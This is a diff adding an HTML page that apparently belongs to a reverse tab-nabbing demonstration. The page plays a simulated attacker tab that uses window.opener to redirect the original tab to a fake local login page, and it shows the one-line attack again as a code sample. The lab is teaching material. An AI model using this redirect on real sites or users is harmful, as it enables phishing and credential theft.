@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>evil.example.com — Shared Resource</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 640px; margin: 60px auto; color: #222; }
+    .badge { background: #fbe9e7; color: #b3331d; padding: 4px 10px; border-radius: 4px; font-size: 12px; }
+    pre { background: #111; color: #eee; padding: 14px; border-radius: 6px; font-size: 13px; overflow-x: auto; }
+    .log { margin-top: 20px; padding: 10px 14px; border-left: 4px solid #b3331d; background: #fbe9e7; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <span class="badge">evil.example.com (simulated)</span>
+  <h2>Totally Legit Shared Resource</h2>
+  <p>This is the attacker-controlled tab the user just opened. Nothing suspicious to see here — the interesting part happens in the background, in the ORIGINAL tab.</p>
+
+  <div id="log" class="log">Checking for a window.opener reference…</div>
+
+  <script>
+    const logBox = document.getElementById('log');
+
+    if (window.opener) {
+      logBox.textContent = "window.opener found! Redirecting the original tab in 2 seconds";
+
+      // This is the entire attack: one line.
+      setTimeout(() => {
+        try {
+          window.opener.location = "http://127.0.0.1:8002/login.html";
+          logBox.textContent += "\n\nDone — switch back to the original tab now.";
+        } catch (e) {
+          logBox.textContent += "\n\nRedirect blocked: " + e.message;
+        }
+      }, 2000);
+    } else {
+      logBox.textContent = "No window.opener reference available — this tab was opened " +
+                            "with noopener/noreferrer (or by a browser default that strips it). " +
+                            "Reverse tab nabbing is not possible here. This is the expected " +
+                            "result when testing fixed.html.";
+    }
+  </script>
+
+  <pre>// The entire vulnerability, in one line of attacker JS:
+if (window.opener) {
+  window.opener.location = "http://127.0.0.1:8002/login.html";
+}</pre>
+</body>
+</html>
